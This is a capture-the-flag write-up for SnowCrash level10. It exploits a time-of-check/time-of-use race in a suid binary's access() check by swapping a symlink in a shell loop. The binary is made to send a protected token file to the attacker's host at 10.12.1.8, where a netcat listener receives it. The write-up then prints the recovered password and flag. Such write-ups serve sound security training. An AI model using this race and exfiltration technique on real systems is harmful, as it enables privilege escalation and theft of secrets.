Level10's home contains level10 suid binary and a token file

Let's try to execute the binary

```
level10@SnowCrash:~$ ./level10
./level10 file host
	sends file to host if you have access to it
level10@SnowCrash:~$
```
As show above the binary takes a file and host to send the content of the file to

If we tried to send token content we get an error

```
level10@SnowCrash:~$ ./level10 token 10.12.1.8
You don't have access to token
level10@SnowCrash:~$
```

Using ltrace to figure out the backgroud check that prevents us from sending token content 

```
level10@SnowCrash:~$ ltrace ./level10 token 10.12.1.8
__libc_start_main(0x80486d4, 3, 0xbffff7a4, 0x8048970, 0x80489e0 <unfinished ...>
access("token", 4)                                           = -1
printf("You don't have access to %s\n", "token"You don't have access to token
)             = 31
+++ exited (status 31) +++
level10@SnowCrash:~$
```

It seems that the binary calls access to verify if the calling process have read access to the file
after that comes the call to open.

We will try to perform a race condition attack against access, by creating a symbolic link to a random file that we have read permission to, then change the symbolic link to token after the access functions complete its check.

We won't be able to do it manual because we need to change the symbolic link in a fraction of seconds.


```
while [ 1 ] ; do rm -rf /tmp/token; ln -s /tmp/file /tmp/token ; rm -rf /tmp/token ; ln -s ~/token /tmp/token; done &
```

Our host ip address is 10.12.1.8
Execute the binary in a loop wait for the race condition to work.

```
while [ 1 ] ; do ./level10 /tmp/token 10.12.1.8; done
```

And starting a netcat listener in our machine to listen for the password for flag10 user
```
[~]$ nc -lvk 6969
.*( )*.
woupa2yuojeeaaed06riuj63c
```

```
level10@SnowCrash:~$ su flag10
Password:
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
flag10@SnowCrash:~$
```